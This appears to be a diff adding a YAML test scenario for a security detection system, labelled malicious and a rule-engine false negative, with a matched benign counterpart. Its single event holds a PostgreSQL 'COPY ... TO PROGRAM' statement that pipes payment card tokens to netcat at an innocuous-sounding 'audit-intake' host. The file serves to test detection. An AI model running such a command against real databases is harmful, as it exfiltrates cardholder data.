@@ -1,0 +1,30 @@
+scenario_id: gen_ecommerce_31_copy_to_program_mal_857m
+family_id: gen_ecommerce_31_copy_to_program_fam_857
+domain: ecommerce
+time_of_day: 02:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT card_token, card_last4 FROM payments) TO PROGRAM 'nc audit-intake.corp
+      443'
+    connects_to:
+      ip: 192.168.8.66
+      port: 9001
+matched_pair_id: gen_ecommerce_31_copy_to_program_pair_857
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
